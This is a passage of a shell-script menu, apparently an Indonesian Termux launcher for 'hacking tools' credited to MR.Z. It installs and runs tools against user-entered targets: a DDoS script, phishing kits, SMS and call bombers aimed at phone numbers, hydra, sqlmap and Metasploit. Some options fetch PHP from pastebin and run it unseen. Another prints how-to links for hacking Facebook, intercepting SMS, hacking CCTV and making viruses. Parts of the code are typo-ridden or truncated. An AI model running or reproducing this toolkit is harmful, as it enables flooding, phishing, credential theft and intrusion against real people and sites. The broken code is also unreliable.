cd $HOME/Human_Level_Control_through_Deep_Reinforcement_Learning
sh install_dependencies.sh
fi

if [ $mytools = 44 ]
then
clearm
toilet -f big -F gay "<=MR.Z=>"
sleep 1
apt update
apt upgrade
apt install git
apt install php
git clone https://github.com/whackashoe/php-spam-mail-honeypot.git
mv php-spam-mail-honeypot $HOME
cd $HOME/php-spam-mail-honeypot
php honeypot.php
fi

if [ $mytools = 45 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/F2hjIGg4RtI"
sleep 5
pkg install python2
pkg install python
pkg install php
pkg install hydra
fi

if [ $mytools = 46 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install python
apt install python2
git clone https://github.com/CiKu370/ipddos.git
mv ipddos $HOME
cd $HOME/ipddos
echo "[Ddos Pake Ip + port]"
echo "[Contoh 127.x.x.x 8080]"
read -p "[Masukan Ip dan port]=>:" target
python2 ipddos.py target
fi

if [ $mytools = 47 ]
then
clear
figlet "<=MR.Z=>" | lolcat
echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1mhttps://youtu.be/VuCvj-8JIME"
sleep 3
apt install git
apt install python
apt install python2
git clone https://github.com/maldevel/IPGeoLocation.git
mv IPGeoLocation $HOME
cd $HOME/IPGeoLocation
chmod +x ipgeoLocation.py
pip install -r requirements.txt
python ipgeolocation.py -m
read -p "[Masukan IP/website]>" target
python ipgeolocation.py -t target
fi

if [ $mytools = 48 ]
then
clear
toilet -f big -F gay "<=MR.Z=>"
sleep 1
aptupdate
apt upgrade
pkg install python
apt install git
git clone https://github.com/m4ll0k/Infoga.git infoga
sleep 1
mv infoga $HOME
cd $HOME/infoga
pip install -r req
python2 infoga.py
fi

if [ $mytools = 49 ]
then
clear
toilet -f big -F gay "<=MR.Z=>" | lolcat
sleep 1
apt update
apt upgrade
apt install git
apt install perl
git clone https://github.com/rezasp/joomscan.git
mv joomscan $HOME
cd $HOME/joomscan
ls
fi

if [ $mytools = 50 ]
then
clear
cowsay -f sheep.cow "<=MR.Z=>" | lolcat
figlet "Mr.B4J1N64N" | lolcat
sleep 1
cd
cd module
python2 katoolin.py
fi

if [ $mytools = 51 ]
then
clear
toilet -f big -F gay "<=MR.Z=>"
sleep 1
apt update
apt upgrade
apt install git
git clone https://github.com/Hax4us/Nethunter-In-Termux.git
mv Nethunter-In-Termux $HOME
cd $HOME/Nethunter-In-Termux
chmod 777 kalinethunter
sh kalinethunter
fi

if [ $mytools = 52 ]
then
clear
toilet -f big -F gay " <=MR.Z=> " | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install wget
apt install proot
git clone https://github.com/Neo-Oli/termux-ubuntu.git
mv termux-ubuntu $HOME
cd $HOME/~/termux-ubuntu
chmod +x ubuntu.sh
sh ubuntu.sh
fi

if [ $mytools = 53 ]
then
clear
toilet -f big -F gay "<=MR.Z=>"
sleep 1
apt update
apt upgrade
apt install git
apt install php
git clone https://github.com/whackashoe/killr.git
mv killr $HOME
cd $HOME/killr
php server.php
fi

if [ $mytools = 54 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
pkg update && pkg upgrade
pkg install git
pkg install python2
git clone https://github.com/ciku370/ko-dork.git
mv ko-dork $HOME
cd $HOME/ko-dork
python2 dork.py
fi

if [ $mytools = 55 ]
then
clear
figlet "<=MR.Z=>" | lolcat
apt update && upgrade
apt install python2
apt install git
cd module
python2 lazymux.py
fi

if [ $mytools = 56 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install python2
apt install git
git clone https://github.com/verluchie/termux-lazysqlmap.git
mv termux-lazysqlmap $HOME
cd $HOME/termux-lazysqlmap
chmod 777 install.sh
./install.sh
lazysqlmap
fi

if [ $mytools = 57 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
pkg install python2
pkg install git
git clone https://github.com/CiKu370/lhst
mv lhst $HOME
cd $HOME/lhst
python2 lhst.py
fi

if [ $mytools = 58 ]
then
clear
echo -e $green" installing fedora "
sleep 1
apt update && apt upgrade
apt-get install git
apt install wget
git clone https://github.com/nmilosev/termux-fedora.git
mv termux-fedora $HOME
cd $HOME/termux-fedora
chmod +x termux-fedora.sh
sh termux-fedora.sh
fi

if [ $mytools = 59 ]
then
clear
toilet -f big -F gay "<=MR.Z=>"
sleep 1
apt update && apt upgrade
pkg install php
pkg install wget
wget https://pastebin.com/raw/sPpJRjCZ -O lokomedia.php
mv lokomedia.php $HOME
cd
php lokomedia.php
fi

if [ $mytools = 60 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
pkg install git
pkg install python2
git clone https://github.com/CiKu370/md5-crack.git
mv md5-crack $HOME
cd $HOME/md5-crack
python2 md5.py
fi

if [ $mytools = 61 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
echo "\033[32;m===================Mempercepat / menstabilkan sinyal 2===================="
sleep 1
echo "\033[32;1m================================By MR.Z================================"
sleep 1
echo ""
echo ""
ping -D www.google.com
fi

if [ $mytools = 62 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
pkg install curl
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod +x metasploit.sh
./metasploit.sh
echo "\033[33;1muntuk tutorial penggunaan metasploit kunjungi:" "\033[36;1m https://www.y$
sleep 5
mv metasploit-framework $HOME
cd $HOME/metasploit-framework
./msfconsole
fi

if [ $mytools = 63 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
pkg install moon-buggy
moon-buggy
fi

if [ $mytools = 64 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
cd module
python2 r.py
fi

if [ $mytools = 65 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
pkg install python
pkg install git
pkg install php
git clone https://github.com/Cvar1984/pemulungBTC.git
mv pemulungBTC $HOME
cd $HOME/pemulungBTC
php autoload.php
php mulung.php
fi

if [ $mytools = 66 ]
then
clear
toilet -f big -F gay " <=MR.Z=> "
sleep 1
apt update && apt upgrade
apt install wget
mkdir ngrok
cd ~/ngrok
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
mv ngrok-stable-linux-arm.zip $HOME
$HOME/unzip ngrok-stable-linux-arm.zip
cd ~/
ls
fi

if [ $mytools = 67 ]
then
clear
toilet -f big -F gay "<=MR.Z=>"
sleep 1
apt update
apt upgrade
apt install git
apt install python
git clone https://github.com/zdresearch/OWASP-Nettacker
mv OWASP-Nettacker $HOME
cd $HOME/OWASP-Nettacker
python2 setup.py
fi

if [ $mytools = 68 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install git
apt install php
git clone https://github.com/Gameye98/OWScan.git
mv OWScan $HOME
cd $HOME/OWScan
php owscan.php
fi

if [ $mytools = 69 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
apt install git
apt install php
git clone https://github.com/evait-security/weeman.git
mv weeman $HOME
cd $HOME/weeman
python2 weeman.py
fi

if [ $mytools = 70 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/qJc1KaD3QcQ"
sleep 5
pkg install git
pkg install python2
git clone https://github.com/senitopeng/PhisingGame.git
mv PhisingGame $HOME
cd $HOME/PhisingGame
python2 phising.py
fi

if [ $mytools = 71 ] || [ $mytools = 71 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/LU0QMstAI88"
sleep 5
pkg install php
pkg install python2
pkg install git
pkg install curl
git clone https://github.com/Lexiie/SocialFish.git
mv SocialFish $HOME
cd $HOME/SocialFish
pip2 install wget
python2 SocialFish.py
fi

if [ $mytools = 72 ]
then
clear
toilet "<=MR.Z=>"
cd module
python2 dog.py
fi

if [ $mytools = 73 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/h2I5HU3W-so"
sleep 3
apt update
apt install git
apt install php
git clone https://github.com/Tuhinshubhra/RED_HAWK
mv RED_HAWK $HOME
cd $HOME/RED_HAWK
chmod +x rhawk.php
php rhawk.php
fi

if [ $mytools = 74 ]
then
clear
toilet "<=MR.Z=>"
cd module
python2 htmd.py
fi

if [ $mytools =  76 ]
then
clear
echo "\033[31;1m"
cowsay ghostbusters.cow "<=MR.Z=>"
figlet "<=MR.Z=>" | lolcat
apt update && apt upgrade
apt install python2
apt install python
apt install git
git clone https://github.com/Kereh/MultiSpam
mv MultiSpam $HOME
cd $HOME/MultiSpam
read -p "==== nomer target awalan [62] contoh 628xxxx===>" target
python2 Multispam.py --count=1000 target
sleep 1
fi

if [ $mytools = 77 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "\033[33;1mUntuk Tutorial Kunjungi:" "\033[36;1mhttps://youtu.be/I5yMLbjvhiY"
pkg install python2
pkg install php
pkg install cowsay
pkg install toilet
pkg install ruby
gem install lolcat
pkg install git
git clone https://github.com/4L13199/LITESPAM.git
mv LITESPAM $HOME
cd $HOME/LITESPAM
sh LITESPAM.sh
fi

if [ $mytools = 78 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
pkg update && pkg upgrade
pkg install git nano
pkg install python2
pip2 install request
pip2 install mechanize
git clone https://github.com/Senitopeng/Boom-CallMail.git
cd Boom-CallMail
nano No.txt
python2 Boom.py
fi

if [ $mytools = 79 ]
then
clear
figlet "<=MR.Z=>" | lolcat
cd module
php tp.php
fi

if [ $mytools = 80 ]
then
clear
toilet "<=MR.Z=>"
cd module
php t.php
fi

if [ $mytools = 81 ]
then
figlet "<=MR.Z=>"
cd module
php mataharimall.php
fi

if [ $mytools = 82 ]
then
clear
toilet "<=MR.Z=>"
cd module
php hooq.php
fi

if [ $mytools = 83 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
apt install php
apt install curl
curl https://pastebin.com/raw/9BYy1JVc -o jdid.php
mv jdid.php $HOME
cd $HOME
php jdid.php
fi

if [ $mytools = 84 ]
then
clear
toilet -f slant --gay "<=MR.Z=>"
cd module
php kfc.php
fi

if [ $mytools = 85 ]
then
clear
toilet -f mono12 -F gay "<=MR.Z=>"
cd module
php phd.php
fi

if [ $mytools = 86 ]
then
clear
toilet "<=MR.Z=>"
cd module
php whiskas.php
fi

if [ $mytools = 87 ]
then
clear
figlet "<=MR.Z=>"
cd module
php zipay.php
fi

if [ $mytools = 88 ]
then
clear
toilet -f slant -F gay "<=MR.Z=>"
pkg install update && pkg install upgrade
pkg install git
pkg install php
cd module
php sqlscan.php
fi

if [ $mytools = 89 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
apt update
apt install git
git clone https://github.com/sqlmapproject/sqlmap
mv sqlmap $HOME
cd $HOME/sqlmap
read -p "Masukan Web Target:" target
python2 sqlmap.py -D target
fi

if [ $mytools = 90 ]
then
clear
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install termux-api
apt install git
apt install php
git clone https://github.com/Cvar1984/Termux-A.git
mv Termux-A $HOME
cd $HOME/Termux-A
php run.php
fi

if [ $mytools = 91 ]
then
clear
figlet "<=MR.Z=>" | lolcat
git clone https://github.com/kuburan/txtool
mv txtool $HOME
cd $HOME/txtool
python2 install.py
python2 update.py
txtool
fi

if [ $mytools = 92 ]
then
clear
toilet -f standard -F gay "<=MR.Z=>"
echo "Copy Link nya => Paste Ke Browser"

echo "\033[33;1mCara Hack Facebook Di Termux:" "\033[36;1m https://youtu.be/FsI4pCapfLY"

echo "\033[33;1mCara Hack ML & COC:" "\033[36;1mhttps://youtu.be/qJc1KaD3QcQ"

echo "\033[33;1mCara Phising Di Termux:" "\033[36;1mhttps://youtu.be/LU0QMstAI88"

echo "\033[33;1mCara Membuat Virus Seperti Asli:" "\033[36;1mhttps://youtu.be/efIhyTJiR00"

echo "\033[33;1mCara Pindah Ke Shell Fish:" "\033[36;1mhttps://youtu.be/cEBsXHkOco0"

echo "\033[33;1mCara Sadap SMS Di Termux:" "\033[36;1mhttps://youtu.be/jQlZg6afZ-Y"

echo "\033[33;1mBelajar Bahasa Pemrograman Bash:" "\033[36;1mhttps://youtu.be/66lkSQ3ZEvE"

echo "\033[33;1mBelajar Bahasa Pemrograman Bash 2:" "\033[36;1mhttps://youtu.be/Gy1J_aMqu$

echo "\033[33;1mCara Sadap HP Di Termux:" "\033[36;1mhttps://youtu.be/n9mlAWTLMXQ"

echo "\033[33;1mCara Browsingan Di Termux:" "\033[36;1mhttps://youtu.be/3sGnqhiwpDM"

echo "\033[33;1mCara Chatingan Di Termux:" "\033[36;1mhttps://youtu.be/Us11rFsJb7A"

echo "\033[33;1mCara Hack CCTV Di Termux:" "\033[36;1mhttps://youtu.be/WliwxqNfefc"

echo "\033[33;1mCara Install Ngrok Di Termux:" "\033[36;1mhttps://youtu.be/ec0M1Rpoh6I"

echo "\033[33;1mCara Mempercantik Termux:" "\033[36;1mhttps://youtu.be/CpQBfiffAjw"

echo "\033[33;1mCara Mencari Admin Login Di Termux:" "\033[36;1mhttps://youtu.be/mLAt3jsO$

echo "\033[33;1mCara Membuat Cowsay Sendiri:" "\033[36;1mhttps://youtu.be/PleMF82Mcgs"

echo "\033[33;1mCara Setel Musik Di Termux:" "\033[36;1mhttps://youtu.be/lo8wqVOjbVw"

echo "\033[33;1mCara Encrypt Tools Python Di Termux:" "\033[36;1mhttps://youtu.be/-HyU7NZVDd8"

echo "\033[33;1mCara Update Status Di Termux:" "\033[36;1mhttps://youtu.be/l9G3QHf6w5s"

echo "\033[33;1mCara Cek Link DeepWeb Di Termux:" "\033[36;1mhttps://youtu.be/8-zFNfMG-Ho"

echo "\033[33;1mCara Menampilkan Animasi Di Termux:" "\033[36;1mhttps://youtu.be/FJF-PIwa0sI"

echo "\033[33;1mCara Menggunakan A-Rat Di Termux:" "\033[36;1mhttps://youtu.be/tx7ykJrqULQ"

echo "\033[33;1mInstall Spammer Grab Terbaru:" "\033[36;1mhttps://youtu.be/z5qVr--gCM8"

echo "\033[33;1mCara Scan Situs Di Termux:" "\033[36;1mhttps://youtu.be/h2I5HU3W-so"

echo "\033[33;1mCara DDOS Di Termux:" "\033[36;1mhttps://youtu.be/EskgepQSB7U"
fi

if [ $mytools = 93 ]
then
clear
toilet "<=MR.Z=>"
cd module
python2 anvima.py
fi

if [ $mytools = 94 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install python2
apt install git
git clone https://github.com/blackvkng/viSQL
mv viSQL $HOME
cd $HOME/viSQL
python2 -m pip install -r requirements.txt                                                            python2 viSQL.py
read -p "[Masukan Website Target]>" target
python2 viSQL.py -t target
fi

if [ $mytools = 95 ]
then
clear
toilet -f big -F gay "<=MR.Z=>" | lolcat
sleep 1
apt update
apt upgrade
apt install git
apt install python2
git clone https://github.com/kereh/VulnScaner
mv VulnScaner $HOME
cd $HOME/VulnScaner
python2 VulnScaner.py
fi

if [ $mytools = 96 ]
then
clear
cowsay -f kiss.cow "<=MR.Z=>" | lolcat
figlet "<=MR.Z=>" | lolcat
sleep 1
apt update && apt upgrade
apt install python2
apt install git
pip2 install -r requirements.txt
git clone https://github.com/m4II0k/WAScan.git
mv WAScan $HOME
cd $HOME/WAScan
pip2 install -r requirements.txt
clear
chmod +x wascan.py
python2 wascan.py
fi

if [ $mytools = 97 ]
then
clear
toilet "<=MR.Z=>"
cd module
python2 whs.py
fi

if [ $mytools = 98 ]
then
echo "BERHASIL KELUAR" |lolcat
sleep 1
echo "$green Terima Kasih Pak BOSS!!"
echo "$blue Sudah Menggunakan TOOLS saya"
echo "$purple ACEH CYBER TEAM"
echo "$yellow Created By MR.Z"
exit
fi
sleep 1
